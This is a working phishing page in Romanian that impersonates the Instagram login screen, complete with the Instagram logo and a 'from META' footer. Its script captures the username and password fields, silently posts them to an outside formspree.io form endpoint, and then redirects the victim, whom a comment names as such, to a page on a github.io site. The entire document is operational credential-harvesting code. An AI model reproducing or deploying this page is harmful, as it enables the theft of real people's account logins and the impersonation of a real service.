<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In</title>
    <style>
        body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { width: 310px; text-align: center; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 3px; }
        .logo-img { width: 175px; margin-bottom: 35px; }
        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 13px; box-sizing: border-box; outline: none; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 14px; }
        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #c7c7c7; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img">
        
        <form id="loginForm" action="https://formspree.io/f/xzdkrgdq" method="POST">
            <input type="text" name="Utilizator" placeholder="Telefon, utilizator sau e-mail" required>
            <input type="password" name="Parola" placeholder="Parolă" required>
            <button type="submit" id="btn">Log in</button>
        </form>
    </div>
    <div class="footer">from META</div>

    <script>
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', function(e) {
            e.preventDefault(); // Oprim trimiterea normala care te duce la pagina de "Thanks"
            
            const btn = document.getElementById('btn');
            btn.innerHTML = "Se conectează...";
            btn.disabled = true;

            // Trimitem datele prin "fetch" (in fundal)
            fetch(form.action, {
                method: 'POST',
                body: new FormData(form),
                headers: { 'Accept': 'application/json' }
            });

            // NU ASTEPTAM raspunsul, o trimitem pe victima DIRECT la pagina de securitate dupa 1 secunda
            setTimeout(function() {
                window.location.href = "https://ryt6ngx4tm-crypto.github.io/mata/verificare/succes.html";
            }, 1000);
        });
    </script>
</body>
</html>
